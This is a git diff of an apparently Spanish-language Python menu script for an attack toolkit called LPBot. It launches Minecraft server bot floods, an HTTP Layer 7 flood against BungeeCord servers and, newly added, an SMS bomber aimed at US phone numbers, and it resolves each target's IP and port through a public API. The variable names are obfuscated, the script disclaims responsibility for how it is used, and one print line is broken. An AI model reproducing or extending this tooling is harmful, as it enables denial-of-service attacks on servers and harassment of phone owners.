@@ -1,5 +1,6 @@
 #coding=utf-8
 
+#No toques nada del codigo si no sabes que haces!
 
 import requests
 from SyncPrint import *
@@ -20,6 +21,10 @@ import click
 import os
 os .system ("clear")
 fecha =datetime .datetime .now ()
+
+def sms ():
+    os .system ("sudo python LPSMSBomber.py")
+
 def exploit ():
     os .system ("sudo python3 LPExploit.py")
 def nmap ():
@@ -32,14 +37,15 @@ def ping ():
     os .system ("sudo python2 LPing.py "+str (O0O0O0O0O0O00O0OO ))
 def bots ():
     print ("")
-    print (" - Versiones DISPONIBLES: ")
-    print ("1 - 1.8 - 1.8.9")
-    print ("2 - 1.9")
-    print ("3 - 1.9.1")
-    print ("4 - 1.9.2")
-    print ("5 - 1.9.3 - 1.9.4")
-    print ("6 - 1.10")
-    print ("7 - Custom protocol")
+    print (" - :::::Version::::: ")
+    print ("1 - .: 1.8 - 1.8.9 :.")
+    print ("2 - .:: 1.9 ::.")
+    print ("3 - .::: 1.9.1 :::.")
+    print ("4 - .::: 1.9.2 :::.")
+    print ("5 - .:: 1.9.3 - 1.9.4 ::.")
+    print ("6 - .: 1.10 :.")
+    print ("")
+    print ("7 - .::: Custom protocol :::.")
     print ("")
     O0OOO0OO00OO00OO0 =input ('\033[1;33;40mroot@LPBot: \033[1;34;40m~ \033[1;37;40m$ ')
     if O0OOO0OO00OO00OO0 ==1 :
@@ -53,24 +59,29 @@ def bots ():
     elif O0OOO0OO00OO00OO0 ==5 :
         OOOOO0O0OOO00O00O =110
     elif O0OOO0OO00OO00OO0 ==6 :
-        OOOOO0O0OOO00O00O =4
+        OOOOO0O0OOO00O00O =210
     elif O0OOO0OO00OO00OO0 ==7 :
         OOOOO0O0OOO00O00O = input("[LPBot] Introduce el Protocolo: ")
     else :
         synckill ('\n\033[1;31;40m[!] Invalid option!')
-    OOO0O00OO0000O00O =['latinplay.net','mc.latinplay.net']
-    ip =raw_input ('\033[1;32;40m[-] IP: ')
-    r1 = os.popen("curl -s https://api.mcsrvstat.us/2/" + ip).read()
-    start1 = ("\"ip\":\"")
-    end1 = "\","
-    a1 = (r1.split(start1))[1].split(end1)[0]
-    
-    r2 = os.popen("curl -s https://api.mcsrvstat.us/2/" + ip).read()
-    start2 = ("\"port\":")
-    end2 = ","
-    a2  = (r2.split(start2))[1].split(end2)[0]
-    O0OOOO0O0O0000O0O = (a1 + ":" + a2)
-    print("[LPBot] Atacando " + str(O0OOOO0O0O0000O0O))
+    OOO0O00OO0000O00O =['example.com']
+    O0OOOO0O0O0000O0O =raw_input ('\033[1;32;40m[-] IP: ')
+    resolvedns = raw_input ('\033[1;32;40m[LPBot] Deseas Obtener IP:PUERTO? (y/n): ')
+    if resolvedns =='y':
+        r1 = os.popen("curl -s https://api.mcsrvstat.us/2/" + O0OOOO0O0O0000O0O).read()
+        start1 = ("\"ip\":\"")
+        end1 = "\","
+        a1 = (r1.split(start1))[1].split(end1)[0]
+            
+        r2 = os.popen("curl -s https://api.mcsrvstat.us/2/" + O0OOOO0O0O0000O0O).read()
+        start2 = ("\"port\":")
+        end2 = ","
+        a2  = (r2.split(start2))[1].split(end2)[0]
+        ipresolved = (a1 + ":" + a2)
+        print("[LPBot] Listo! " + str(ipresolved))
+        ipnueva = raw_input("[LPBot] Deseas utilizar la ip numerica como objetivo? (y/n): ")
+        if ipnueva == 'y':
+            O0OOOO0O0O0000O0O = raw_input ('\033[1;32;40m[-] IP (Incluye IP:PUERTO): ')
     if (O0OOOO0O0O0000O0O in OOO0O00OO0000O00O ):
         synckill ('\n\033[1;31;40m[!] IP Blacklisted!')
     O00000O0OO00OOO0O =input ('\033[1;32;40m[-] Sesiones: ')
@@ -298,21 +309,22 @@ def bots ():
             time .sleep (1000 )
     except (KeyboardInterrupt ,SystemExit ):
         synckill ('\n\033[1;31;40m[!] Deteniendo con exito!')
-print ("------------------------------------------------------")
-print (" Bienvenido Usuario, / "+str (fecha ))
-print ("------------------------------------------------------")
-print (" 1 - Escaneo")
+print ("______________________________________________________")
+print (" Welcome to LPBot // "+str (fecha ))
+print ("______________________________________________________")
 print ("")
-print (" 2 - Ping (Puerto TCP)")
+print (" 1 - Escaneo                  - Escanea una IP utilizando NMAP")
+print (" 2 - Ping (Puerto TCP)        - Pinguea una IP:PUERTO utilizando paquetes TCP")
+print (" 3 - Bots                     - Bots para minecraft (1.8 - 1.x.x)")
+print (" 4 - HTTPExploit (BungeeCord) - Floodea BC con paquetes HTTP a IP:25565 (Layer 7)")
+print (" 5 - SMS Bomber (Only US)     - SMS bombing a un telefono de USA
 print ("")
-print (" 3 - Bots")
+print (" 6 - Salir")
+print ("______________________________________________________")
 print ("")
-print (" 4 - HTTP Exploit (BungeeCord)")
-print ("")
-print (" 5 - Salir")
-print ("------------------------------------------------------")
-print ("")
-eleccion =input ("> Seleccióna una opción [1-5]: ")
+print("## NO NOS HACEMOS RESPONSABLES DE TUS ACTOS // May the fun BEGIN")
+print("")
+eleccion =input ("Opción [1-5]: ")
 if (eleccion ==1 ):
     nmap ()
 if (eleccion ==2 ):
@@ -322,4 +334,6 @@ if (eleccion ==3 ):
 if (eleccion ==4 ):
     exploit ()
 if (eleccion ==5 ):
+    sms()
+if (eleccion ==6 ):
     synckill ('\n\033[1;31;40m[!] Que tenga un buen dia!')
